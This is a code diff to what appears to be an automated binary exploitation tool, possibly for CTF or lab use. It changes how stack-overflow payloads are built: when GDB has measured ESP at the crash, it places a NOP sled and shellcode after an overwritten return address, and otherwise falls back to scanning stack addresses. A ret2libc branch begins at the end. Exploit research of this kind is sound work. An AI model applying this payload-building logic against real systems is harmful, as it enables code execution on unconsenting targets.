@@ -749,24 +749,42 @@ def solve(
             res.error = "offset unknown — run probe first"
             return res
 
-        base = 0xbfffe2e4 if cfg.target.arch == "i386" else 0x7fffffffe000
-        if verbose:
-            print(f"  Scanning stack addresses (base={hex(base)}, esp_at_crash={hex(esp_at_crash)})...")
-        addr = scan_shellcode_addr(
-            r.binary, strat.offset, strat.input_mode, cfg,
-            base_addr=base, esp_at_crash=esp_at_crash, verbose=verbose,
-        )
-        if addr:
-            res.addresses["esp_at_overflow"] = addr
-            nop_len = strat.offset - len(shellcode)
-            total = strat.offset + 4
+        NOP_SLED = 16
+        if esp_at_crash:
+            # Post-EIP layout: GDB measured ESP after ret directly — use it as the
+            # return address. Shellcode is placed after the fake EIP so the buffer
+            # size constraint (offset >= shellcode length) no longer applies.
+            # A 16-byte NOP sled absorbs the tiny GDB-env vs real-env stack delta.
+            total = strat.offset + 4 + NOP_SLED + len(shellcode)
+            res.addresses["esp_at_overflow"] = esp_at_crash
             res.payload_layout = (
-                f"[{nop_len}x NOP] [{len(shellcode)}x shellcode] [p32({hex(addr)})]"
+                f"[{strat.offset}x 'A'] [p32({hex(esp_at_crash)})] [{NOP_SLED}x NOP] [{len(shellcode)}x shellcode]"
                 f"  →  {total} bytes total"
             )
-            res.notes.append(f"shellcode: {len(shellcode)} bytes  nop_sled: {nop_len} bytes")
+            res.notes.append(
+                f"shellcode: {len(shellcode)} bytes  post-EIP (ret→esp={hex(esp_at_crash)}, "
+                f"nop_sled={NOP_SLED})"
+            )
         else:
-            res.error = "address scan exhausted — adjust BASE_ADDR in exploit or re-run GDB probe"
+            # Fallback when no GDB esp measurement: scan for the buffer start.
+            base = 0xbfffe2e4 if cfg.target.arch == "i386" else 0x7fffffffe000
+            if verbose:
+                print(f"  Scanning stack addresses (base={hex(base)}, no esp_at_crash)...")
+            addr = scan_shellcode_addr(
+                r.binary, strat.offset, strat.input_mode, cfg,
+                base_addr=base, esp_at_crash=0, verbose=verbose,
+            )
+            if addr:
+                res.addresses["esp_at_overflow"] = addr
+                nop_len = strat.offset - len(shellcode)
+                total = strat.offset + 4
+                res.payload_layout = (
+                    f"[{nop_len}x NOP] [{len(shellcode)}x shellcode] [p32({hex(addr)})]"
+                    f"  →  {total} bytes total"
+                )
+                res.notes.append(f"shellcode: {len(shellcode)} bytes  nop_sled: {nop_len} bytes")
+            else:
+                res.error = "address scan exhausted — adjust BASE_ADDR in exploit or re-run GDB probe"
 
     elif strat.name == "ret2libc":
         sys_addr = r.plt.get("system") or r.functions.get("system")
